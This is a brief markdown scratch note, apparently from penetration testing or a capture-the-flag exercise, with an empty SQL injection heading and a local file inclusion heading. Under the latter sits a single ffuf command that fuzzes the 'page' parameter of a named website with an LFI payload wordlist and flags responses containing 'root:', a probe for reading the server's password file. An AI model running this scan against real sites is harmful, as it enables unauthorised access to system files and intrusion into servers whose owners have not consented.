# SQLi

# LFI
```
ffuf -u "https://www.ravagedband.com/index.php?page=FUZZ" -w /usr/share/wordlists/payloads/lfi.txt -c -mr "root:" -of md -o target.md
```